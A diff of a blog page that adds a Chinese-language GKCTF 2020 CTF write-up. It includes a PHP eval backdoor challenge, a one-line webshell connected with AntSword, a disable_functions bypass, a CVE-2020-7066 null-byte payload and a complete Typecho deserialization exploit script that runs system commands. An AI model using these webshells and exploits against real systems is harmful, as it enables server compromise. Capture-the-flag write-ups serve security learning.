@@ -446,7 +446,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-31
+                    2020-05-26
                 </div>
                 
 
@@ -455,7 +455,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    129
+                    547
                 </div>
                 
 
@@ -472,12 +472,99 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="GKCTF2020-Pokémon"><a href="#GKCTF2020-Pokémon" class="headerlink" title="[GKCTF2020]Pokémon"></a>[GKCTF2020]Pokémon</h3><p>这个gba模拟器打开开金手指就可以了</p>
+                <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h3><p>源码给出：</p>
+<pre><code class="php">&lt;?php 
+highlight_file(__FILE__);
+class ClassName
+{
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        {
+                $this-&gt;code = @$this-&gt;x()['Ginkgo'];
+                $this-&gt;decode = @base64_decode( $this-&gt;code );
+                @Eval($this-&gt;decode);
+        }
+
+        public function x()
+        {
+                return $_REQUEST;
+        }
+}
+new ClassName();</code></pre>
+<p><code>Ginkgo</code>参数可控，base64了一下，eval-&gt;命令执行</p>
+<p>直接传一个马<code>eval($_POST[hack]);</code>，蚁剑连接</p>
+<p><img src="https://i.loli.net/2020/06/05/BLJz3nWtbyhRrO4.png" alt="1.png">发现了flag文件，但是权限是0700，不够。发现了readflag文件</p>
+<p>post一下hack=phpinfo();，发现ban掉了大多数执行命令的函数</p>
+<p>注意到：</p>
+<p><img src="https://i.loli.net/2020/06/05/9RHGpZtyFBCzlm7.png" alt="2.png"></p>
+<p>找了一下7.0-7.3的bypass disable_function的POC，上传到/tmp目录下（www没权限），之后include一下就可以了。</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>CVE签到</p>
+<p>查了一下CVE-2020-7066，就是利用%00截断让get_headers()请求到错误的主机。</p>
+<p>payload：</p>
+<pre><code>?url=http://127.0.0.1%00.ctfhub.com</code></pre><h3 id="老八小超市"><a href="#老八小超市" class="headerlink" title="老八小超市"></a>老八小超市</h3><p>shopXO CMS的版本漏洞。下载主题传马的套路。</p>
+<h3 id="EzTypecho"><a href="#EzTypecho" class="headerlink" title="EzTypecho"></a>EzTypecho</h3><p>看标题是typecho系列的漏洞，参考这篇文章：<a href="https://www.freebuf.com/vuls/152058.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/152058.html</a></p>
+<p>exp：</p>
+<pre><code class="php">&lt;?php
+
+class Typecho_Feed
+{
+    const RSS1 = 'RSS 1.0';
+    const RSS2 = 'RSS 2.0';
+    const ATOM1 = 'ATOM 1.0';
+    const DATE_RFC822 = 'r';
+    const DATE_W3CDTF = 'c';
+    const EOL = "\n";
+    private $_type;
+    private $_items;
+
+    public function __construct()
+    {
+        $this-&gt;_type = $this::RSS2;
+        $this-&gt;_items[0] = array(
+            'title' =&gt; '1',
+            'content' =&gt; '1',
+            'link' =&gt; '1',
+            'date' =&gt; 1540996608,
+            'category' =&gt; array(new Typecho_Request()),
+            'author' =&gt; new Typecho_Request(),
+        );
+    }
+}
+
+class Typecho_Request
+{
+    private $_params = array();
+    private $_filter = array();
+
+    public function __construct(){
+        $this-&gt;_params['screenName'] = 'system("cat /flag");';//执行的代码
+        $this-&gt;_filter[0] = 'assert';
+    }
+}
+
+$payload = array(
+    'adapter' =&gt; new Typecho_Feed(),
+    'prefix' =&gt; 'typecho_'
+);
+
+echo base64_encode(serialize($payload));
+
+?&gt;</code></pre>
+<p>关键代码如下：</p>
+<p><img src="https://i.loli.net/2020/06/06/ocR4iLHqyjnFMrb.png" alt="3.png"></p>
+<p><code>$_GET['finish']</code>不为空，其次是<code>referer</code>需要是本站</p>
+<p><img src="https://i.loli.net/2020/06/06/4m9FxYaETuwf3I6.png" alt="4.png"></p>
+<p>需要传入start，还有一个反序列化点</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="GKCTF2020-Pokémon"><a href="#GKCTF2020-Pokémon" class="headerlink" title="[GKCTF2020]Pokémon"></a>[GKCTF2020]Pokémon</h3><p>这个gba模拟器打开开金手指就可以了</p>
 <h3 id="GKCTF2020-code-obfuscation"><a href="#GKCTF2020-code-obfuscation" class="headerlink" title="[GKCTF2020]code obfuscation"></a>[GKCTF2020]code obfuscation</h3><p>HXD分析图片，binwalk得到压缩包，有密码，非伪加密。</p>
 <p>倾斜的二维码，用PS调正，粗糙修复，扫码得到base(gkctf)</p>
 <p>试出来是base58，当做压缩包密码</p>
 <p>发现一个js</p>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><script>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="小学生的密码学"><a href="#小学生的密码学" class="headerlink" title="小学生的密码学"></a>小学生的密码学</h3><p>仿射密码，百度一搜就有。。。</p>
+<h3 id="汉字的秘密"><a href="#汉字的秘密" class="headerlink" title="汉字的秘密"></a>汉字的秘密</h3><p>当铺密码+变异凯撒</p>
+<p>凯撒规律是：对比<code>FLAG</code>的ascii发现每一位加上相差逐渐加1</p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -601,58 +688,9 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
-            <div class="card">
-                <a href="/posts/1fa2.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/4.jpg" class="responsive-img" alt="GKCTF复现">
-                        
-                        <span class="card-title">GKCTF复现</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            WebMisc[GKCTF2020]Pokémon这个gba模拟器打开开金手指就可以了
-[GKCTF2020]code obfuscationHXD分析图片，binwalk得到压缩包，有密码，非伪加密。
-倾斜的二维码，用PS调正，粗糙修复
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-31
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            V1cuna
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF-WP/">
-                        <span class="chip bg-color">-CTF -WP</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
                 <a href="/posts/ccdc.html">
                     <div class="card-image">
@@ -672,9 +710,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-29
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-29
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -696,6 +734,59 @@
                     
                     <a href="/tags/BUU/">
                         <span class="chip bg-color">BUU</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/undefined.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/6.jpg" class="responsive-img" alt="De1CTF 2020 WP">
+                        
+                        <span class="card-title">De1CTF 2020 WP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            这次队伍最后排了82名，继续加油哇。
+做的题有点少，有机会慢慢复现
+WebCheckIN一个文件上传的题。
+Server: Apache2.4.6 (CentOS) PHP/5.4.16
+X-Powered-By: PHP/5.4.16用户
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            V1cuna
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WP/">
+                        <span class="chip bg-color">WP</span>
                     </a>
                     
                 </div>
